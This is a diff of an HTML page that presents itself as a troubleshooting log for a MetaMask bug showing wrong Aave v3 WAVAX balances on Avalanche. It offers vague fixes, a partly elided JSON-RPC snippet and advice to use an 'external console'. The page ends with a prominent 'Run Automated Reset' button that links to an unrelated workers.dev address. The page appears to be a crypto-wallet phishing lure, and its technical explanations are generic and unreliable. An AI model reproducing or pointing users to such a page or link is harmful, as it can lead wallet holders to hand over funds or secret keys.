@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: -apple-system;
-        background: #0a0c10;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #ff9455; }
     .btn {
         background: #ff9455;
         color: #000;
@@ -42,18 +42,18 @@
 <h1>Metamask Extension Bug Incorrect Balance For Aave V3 Wavax Token</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users of the Metamask extension on the Avalanche network may notice that their balance for the Aave v3 WAVAX token is incorrectly displayed, potentially leading to confusion and incorrect transactions.</li>
+<li>Users of the Metamask extension on the Avalanche network may notice that their Aave v3 WAVAX token balance is being displayed incorrectly, potentially causing confusion and issues with transactions.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a miscommunication between the Metamask extension and the Aave v3 protocol on the Avalanche network, resulting in an incorrect balance being fetched and displayed to the user.</li>
+<li>The error occurs due to a bug in the Metamask extension's handling of the Aave v3 WAVAX token on the Avalanche network, resulting in an incorrect balance being displayed to the user.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
 <li>To resolve the issue, users can try the following manual overrides:</li>
-<li>Update the Metamask extension to the latest version</li>
-<li>Reset the Metamask account by removing and re-adding the Avalanche network</li>
-<li>Use the following JSON-RPC request to fetch the correct balance:</li>
+<li>Update Metamask to the latest version</li>
+<li>Reset the Metamask account</li>
+<li>Use the following JSON-RPC command to refresh the token balance:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
 <span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
@@ -69,14 +69,14 @@
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for a more seamless experience.</p>
+<p>Consider utilizing an external console for a more streamlined debugging experience.</p>
 <h2>Prerequisites</h2>
 <ul>
 <li>Metamask extension installed and configured</li>
-<li>Aave v3 protocol enabled on the Avalanche network</li>
-<li>Basic understanding of JSON-RPC requests and Metamask configuration</li>
+<li>Aave v3 WAVAX token added to the Metamask wallet</li>
+<li>Avalanche network selected in Metamask</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-bug-swap-and-bridge-fail-on-arbitrum-network.html">Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-assets-native-assets-for-custom-networks.html">Metamask Extension Bug Assets Native Assets For Custom Networks</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sl-tp-percentages-change-when-changing-l.html">Metamask Extension Bug Sl Tp Percentages Change When Changing L</a></li><li><a href="./archive/2026/06/metamask-extension-bug-swap-and-bridge-fail-on-arbitrum-network.html">Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
